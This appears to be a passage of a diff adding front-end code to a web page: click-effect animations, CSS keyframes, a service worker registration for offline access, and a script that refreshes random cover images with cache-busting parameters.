+      text.innerHTML = texts[Math.floor(Math.random() * texts.length)];
+      text.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;font-size:18px;font-weight:bold;color:#3498db;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);animation:textFloat 0.8s ease-out forwards;';
+      document.body.appendChild(text);
+      setTimeout(function() { text.remove(); }, 800);
+    },
+    
+    animateParticle: function(el, startX, startY, endX, endY, duration) {
+      var startTime = performance.now();
+      function animate(currentTime) {
+        var progress = Math.min((currentTime - startTime) / duration, 1);
+        var easeOut = 1 - Math.pow(1 - progress, 3);
+        el.style.left = (startX + (endX - startX) * easeOut) + 'px';
+        el.style.top = (startY + (endY - startY) * easeOut) + 'px';
+        el.style.opacity = 1 - progress;
+        if (progress < 1) requestAnimationFrame(animate);
+        else el.remove();
+      }
+      requestAnimationFrame(animate);
+    }
+  };
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', function() { clickEffects.init(); });
+  } else {
+    clickEffects.init();
+  }
+  
+  window.ClickEffects = clickEffects;
+})();
+</script>
+
+<style>
+@keyframes rippleExpand {
+  0% { width: 0; height: 0; opacity: 1; }
+  100% { width: 100px; height: 100px; opacity: 0; }
+}
+@keyframes particleFloat {
+  0% { opacity: 1; transform: translateY(0) scale(1); }
+  100% { opacity: 0; transform: translateY(-40px) scale(0.5); }
+}
+@keyframes textFloat {
+  0% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+  100% { opacity: 0; transform: translate(-50%, -80px) scale(1.2); }
+}
+</style>
+
+<!-- PWA Service Worker -->
+<script>
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/sw.js').then(function(reg) {
+    console.log('Service Worker 已注册，支持离线访问');
+  }).catch(function(err) {
+    console.log('Service Worker 注册失败:', err);
+  });
+}
+</script>
+
+<!-- Random Cover Image -->
+<script>
+(function() {
+  function refreshRandomCovers() {
+    var images = document.querySelectorAll('img[src*="loliapi.com"]');
+    images.forEach(function(img) {
+      var src = img.src;
+      var baseSrc = src.split('?')[0];
+      img.src = baseSrc + '?t=' + Date.now() + '&r=' + Math.random().toString(36).substr(2, 9);
+    });
+  }
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', refreshRandomCovers);
+  } else {
+    refreshRandomCovers();
+  }
+})();
+</script>
+
+</div></body></html>
